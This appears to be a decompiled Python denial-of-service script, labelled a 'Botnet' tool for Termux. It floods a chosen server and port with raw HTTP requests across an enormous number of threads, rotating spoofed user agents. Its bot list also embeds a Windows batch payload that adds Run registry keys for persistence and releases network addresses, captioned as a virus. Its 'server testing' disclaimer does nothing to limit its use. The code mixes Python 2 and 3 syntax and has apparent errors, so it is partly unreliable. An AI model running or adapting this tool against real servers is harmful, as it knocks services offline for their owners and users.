# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Mar 20 2021, 14:58:25) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: <febry>
"""
Copyright [2019] [Botnet attack GNU # TERMUX BY Mrlinkerrorsystem]

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

 http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
"""
import ssl
from queue import Queue
from optparse import OptionParser
import time, sys, socket, threading, logging, urllib.request, random

def user_agent():
    global uagent
    uagent = []
    uagent.append('Mozilla/5.0 WinInet')
    uagent.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)')
    uagent.append('Opera/9.80')
    uagent.append('SuperBot/3.0 (Win32)')
    uagent.append('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299')
    uagent.append('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36')
    uagent.append('Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36')
    uagent.append('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36')
    uagent.append('Mozilla/5.0 (Linux; U; Android 4.0.3; es-es; i-Joy-Andromeda Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30')
    uagent.append('Mozilla/5.0 (Linux; U; Android 4.0.3; en-gb; i-Joy-Andromeda Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30')
    uagent.append('Mozilla/5.0 (Linux; U; Android 4.0.3; ru-ru; i-Joy-Andromeda Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30')
    uagent.append('Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36')
    uagent.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36')
    uagent.append('Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36')
    uagent.append('Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.811.0 Safari/535.1')
    uagent.append('Mozilla/5.0 (X11; CrOS i686 12.433.109) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.93 Safari/534.30')
    uagent.append('Mozilla/5.0 (Macintosh; U; Mac OS X 10_6_1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/ Safari/530.5')
    uagent.append('Mozilla/5.0 (Linux; U; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13')
    uagent.append('Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1')
    uagent.append('Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20130401 Firefox/21.0')
    uagent.append('Mozilla/6.0 (Windows; U; Windows NT 7.0; en-US; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.9 (.NET CLR 3.5.30729)')
    uagent.append('Mozilla/5.0 (X11; U; Linux x86_64; fr; rv:1.9.0.9) Gecko/2009042114 Ubuntu/9.04 (jaunty) Firefox/3.0.9')
    uagent.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-TW; rv:1.8.0.2) Gecko/20060308 Firefox/1.5.0.2')
    uagent.append('Mozilla/5.0 (Windows; U; Windows NT5.1; en; rv:1.7.10) Gecko/20050716 Firefox/1.0.5')
    uagent.append('Mozilla/5.0 (Windows; U; Win98; fr-FR; rv:1.7.6) Gecko/20050226 Firefox/1.0.1')
    uagent.append('Mozilla/5.0 (X11; U; Linux i686; de-DE; rv:1.6) Gecko/20040207 Firefox/0.8')
    uagent.append('Mozilla/5.0 (X11) KHTML/4.9.1 (like Gecko) Konqueror/4.9')
    uagent.append('Mozilla/5.0 (compatible; Konqueror/4.5; FreeBSD) KHTML/4.5.4 (like Gecko)')
    uagent.append('Mozilla/5.0 (compatible; Konqueror/3.5; NetBSD 4.0_RC3; X11) KHTML/3.5.7 (like Gecko)')
    uagent.append('Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko')
    uagent.append('Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko')
    uagent.append('Mozilla/4.0(compatible; MSIE 7.0b; Windows NT 6.0)')
    uagent.append('Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)')
    uagent.append('Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)')
    uagent.append('Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)')
    uagent.append('Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)')
    uagent.append('Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)')
    uagent.append('Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)')
    uagent.append('Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)')
    uagent.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0')
    uagent.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; yie8)')
    uagent.append('Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 5.1; .NET CLR 1.1.4322; Zango 10.1.181.0)')
    uagent.append('Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
    uagent.append('Mozilla/4.0 (compatible; MSIE 6.0; AOL 8.0; Windows NT 5.1; SV1)')
    uagent.append('Mozilla/5.0 (X11; Ubuntu; Linux armv7l; rv:17.0) Gecko/20100101 Firefox/17.0')
    uagent.append('Mozilla/2.02E (Win95; U)')
    uagent.append('Mozilla/5.0 (iPhone; U; CPU iOS 2_0 like Mac OS X; en-us)')
    uagent.append('Mozilla/5.0 (Linux; U; Android 0.5; en-us)')
    uagent.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)')
    uagent.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)')
    return uagent


def my_bots():
    global bots
    bots = []
    bots.append('echo @echo off&gt;c:windowswimn32.bat echo break off&gt;&gt;c:windowswimn32.bat echo ipconfig/release_all&gt;&gt;c:windowswimn32.bat echo end&gt;&gt;c:windowswimn32.bat reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f echo HELLO MY NAME IS VIRUS PAUSE')
    bots.append('http://validator.w3.org/check?uri=')
    bots.append('dfwdiesel.net/check?u=')
    bots.append('bot')
    bots.append('spider')
    bots.append('crawl')
    bots.append('^.?$')
    bots.append('[^a]fish')
    bots.append('^IDA$')
    bots.append('^ruby$')
    bots.append('^voyager\\/')
    bots.append('^@ozilla\\/\\d')
    bots.append('^\xe8\x84\x9d\xe8\x84\x9d\xe9\x99\x86\xe8\x8a\x92\xe6\xbd\x9e\xe8\xb4\xb8\xe7\xa2\x8c\xe8\x84\x9b$')
    bots.append('^\xe7\xa0\xb4\xe8\xa7\xa3\xe5\x90\x8e\xe7\x9a\x84$')
    bots.append('AddThis')
    bots.append('A6\\-Indexer')
    bots.append('ADmantX')
    bots.append('alexa')
    bots.append('Alexandria(\\s|\\+)prototype(\\s|\\+)project')
    bots.append('AllenTrack')
    bots.append('almaden')
    bots.append('appie')
    bots.append('API[\\+\\s]scraper')
    bots.append('Arachni')
    bots.append('Arachmo')
    bots.append('architext')
    bots.append('ArchiveTeam')
    bots.append('aria2\\/\\d')
    bots.append('arks')
    bots.append('^Array$')
    bots.append('/maps/api/js/')
    bots.append('/maps/api/place/js/')
    bots.append('/maps/api/staticmap?')
    bots.append('/maps/api/streetview?')
    bots.append('/maps/api/streetview/')
    bots.append('http://www.google.co.id/robots.txt')
    bots.append('http://www.facebook.com/robots.txt')
    bots.append('http://www.twitter.com/robots.txt')
    bots.append('http://www.wikipedia.org/robots.txt')
    bots.append('http://www.yahoo.com/robots.txt')
    bots.append('http://www.bing.com/robots.txt')
    bots.append('http://heightsmedia.com/xmlrpc.php')
    bots.append('https://downforeveryoneorjustme.com/')
    bots.append('Privoxy/1.0')
    bots.append('CERN-LineMode/2.15')
    bots.append('cg-eye interactive')
    bots.append('China Local Browser 2.6')
    bots.append('ClariaBot/1.0')
    bots.append('Comos/0.9_(robot@xyleme.com)')
    bots.append('Crawler@alexa.com')
    bots.append('DonutP; Windows98SE')
    bots.append('Dr.Web (R) online scanner: http://online.drweb.com/')
    bots.append('Dragonfly File Reader')
    bots.append('Eurobot/1.0 (http://www.ayell.eu)')
    bots.append('FARK.com link verifier')
    bots.append('FavIconizer')
    bots.append('Feliz - Mixcat Crawler (+http://mixcat.com)')
    bots.append('TwitterBot (http://www.twitter.com)')
    bots.append('DataCha0s/2.0')
    bots.append('EvaalSE - bot@evaal.com')
    bots.append('Feedfetcher-Google; (+http://www.google.com/feedfetcher.html)')
    bots.append('archive.org_bot')
    bots.append('pentagon.gov')
    bots.append('nasa.gov')
    return bots


def bot_hammering(url):
    try:
        while True:
            req = urllib.request.urlopen(urllib.request.Request(url, headers={'bots': random.choice(bots)} + {'User-Agent': random.choice(uagent)}))
            print '\x1b[94mBOT RE FRESHING...\x1b[0m'
            time.sleep(0.1)

    except:
        time.sleep(0.1)


def down_it(item):
    global data
    try:
        while True:
            packet = str('GET / HTTP/1.1\nHost: ' + host + '\n\n bots: ' + random.choice(bots) + '\n' + '\n\n User-Agent: ' + random.choice(uagent) + '\n' + data).encode('utf-8')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            if s.sendto(packet, (host, int(port))):
                s.shutdown(1)
                print ('\x1b[94m sent botnet attack! TO--> \x1b[0 \x1b[92m', host, '\x1b[0m')
            else:
                s.shutdown(1)
                print '\x1b[91mshut<->down\x1b[0m'
            time.sleep(0.1)

    except socket.error as e:
        print '\x1b[91m server  down\x1b[0m'
        time.sleep(0.1)


def dos():
    while True:
        item = q.get()
        down_it(item)
        q.task_done()


def dos2():
    while True:
        item = w.get()
        bot_hammering(random.choice(bots) + 'http://' + host)
        w.task_done()


def usage():
    print " \x1b[92m\t botnet Script v.2\n\tIt is the end user's responsibility to obey all applicable laws.\n\tIt is just for server testing script. Your ip is visible. \n\n\tusage : python3 Botnet.py [-s] [-p] [-t]\n\t-h : help\n\t-s : server ip\n\t-p : port default 80\n\t-t : turbo default 135 \x1b[0m"
    sys.exit()


def get_parameters():
    global host
    global port
    global thr
    optp = OptionParser(add_help_option=False, epilog='Hammers')
    optp.add_option('-q', '--quiet', help='set logging to ERROR', action='store_const', dest='loglevel', const=logging.ERROR, default=logging.INFO)
    optp.add_option('-s', '--server', dest='host', help='attack to server ip -s ip')
    optp.add_option('-p', '--port', type='int', dest='port', help='-p 80 default 80')
    optp.add_option('-t', '--turbo', type='int', dest='turbo', help='default 135 -t 135')
    optp.add_option('-h', '--help', dest='help', action='store_true', help='help you')
    opts, args = optp.parse_args()
    logging.basicConfig(level=opts.loglevel, format='%(levelname)-8s %(message)s')
    if opts.help:
        usage()
    if opts.host is not None:
        host = opts.host
    else:
        usage()
    if opts.port is None:
        port = 80
    else:
        port = opts.port
    if opts.turbo is None:
        thr = 100000000000L
    else:
        thr = opts.turbo
    return


headers = open('headers.txt', 'r')
data = headers.read()
headers.close()
q = Queue()
w = Queue()
if __name__ == '__main__':
    if len(sys.argv) < 2:
        usage()
    get_parameters()
    print ('\x1b[92m', host, ' port: ', str(port), ' turbo: ', str(thr), '\x1b[0m')
    print '\x1b[94mMENYIAPKAN BOT...\x1b[0m'
    user_agent()
    my_bots()
    time.sleep(5)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(port)))
        s.settimeout(1)
    except socket.error as e:
        print '\x1b[91mcheck server ip and port\x1b[0m'
        usage()

    while True:
        for i in range(int(thr)):
            t = threading.Thread(target=dos)
            t.daemon = True
            t.start()
            t2 = threading.Thread(target=dos2)
            t2.daemon = True
            t2.start()

        start = time.time()
        item = 0
        while True:
            if item > 1800:
                item = 0
                time.sleep(0.1)
            item = item + 1
            q.put(item)
            w.put(item)

        q.join()
        w.join()

# global item ## Warning: Unused global